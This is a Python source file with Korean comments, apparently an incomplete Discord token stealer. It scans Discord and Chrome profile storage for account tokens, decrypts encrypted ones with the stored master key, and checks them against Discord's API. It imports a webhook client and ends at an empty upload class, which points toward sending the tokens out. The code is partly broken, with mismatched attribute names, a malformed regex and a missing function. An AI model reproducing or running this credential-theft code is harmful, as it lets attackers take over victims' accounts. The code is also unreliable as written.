import base64
import json
import os
import re

import requests
from Crypto.Cipher import AES
from discord import Embed, SyncWebhook
from win32crypt import CryptUnprotectData

def get_token(webhook: str) -> None:
    # 토큰 얻는 코드
    pass

class extract:
    def __init__(self):
        self.base_url = "https://discord.com/api/v9/users/@me"

        self.appdata_path = os.getenv("localappdata") # 경로 지정 파트
        self.roadming_path = os.getenv("appdata")

        # 정규식 지정 파트
        self.regexp = r"[\w-]{24}\.[w-]{6}\.[w-]{25,110}" # 디스코드 코큰을 찾기 위한 정규식
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

        self.token, self.uid = [], [] # 리스트에 만들어서 저장할 것.
        path = { # 각 프로그램의 경로
            'Discord' : self.roaming_path + '\\discord\\Local Storage\\leveldb',
            'Chrome': self.appdata_path + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\', # 크롬 프로필 별로 구분(최대 5)
            'Chrome3': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata_path + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
        }

        for fname, fpath in path.items():
            if not os.path.exists(path):
                continue
            __DISCORD__ = fname.replace(" ", "").lower()
            if "cord" in fpath:
                if not os.path.exists(self.roadming_path+f'\\{__DISCORD__}\\Local State'):
                    continue # 경로가 없다고 당황하지 않기.
                for f_name in os.listdir(fpath):
                    if f_name[-3:] not in ["log", "ldb"]: # 확장자(3글자)가 log나 ldb가 아닐 경우
                        continue # 계속 해야지 뭘 어째
                    for line in [x.strip() for x in open(f'{fpath}\\{f_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            tok = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{__DISCORD__}\\Local State'))
                            
                            if self.validate_token(tok): # 토큰 존재여부 확인
                                ud = requests.get(self.base_url, headers={'Authorization': tok}).json()['id'] # 디스코드 api로부터 해당하는 id를 가져옴
                                if ud not in self.uid: # 그 토큰의 소유자가 있고, 아이디가 현재 배열에 없다면
                                    self.token.append(tok) # 토큰 집어넣고
                                    self.uid.append(ud) # uid도 집어넣기
            else: # 디스코드 파일이 없어...?
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{f_name}', errors='ignore').readlines() if x.strip()]:
                        for tok in re.findall(self.regexp, line):
                            if self.validate_token(tok):
                                ud = requests.get(self.base_url, headers={'Authorization': tok}).json()['id']
                                if ud not in self.uids:
                                    self.token.append(tok)
                                    self.uid.append(ud)  

    def validate_token(self, token: str) -> bool: # 존재 여부를 판단하기에 불이 적합하다고 생각함
        req = requests.get(self.base_url, headers={'Authorization': token})

        if req.status_code == 200:
            return True # 200은, 응답이 정상적으로 처리되었다는 뜻이다.
            # 즉 토큰이 존재한다는 것
        
        return False # Else 문을 쓸 필요가 없는게, if에서 걸러지면 어짜피 프로그램을 나가는데 여기까지 온다는 것은 if에서 안 걸러짐을 의미.
    
    def decrypt_val(self, buff: bytes, masterkey: bytes) -> str: # 아래 내용(decrypt_val, get_master_key는 디스코드에서 얻음)
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(masterkey, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

class upload():
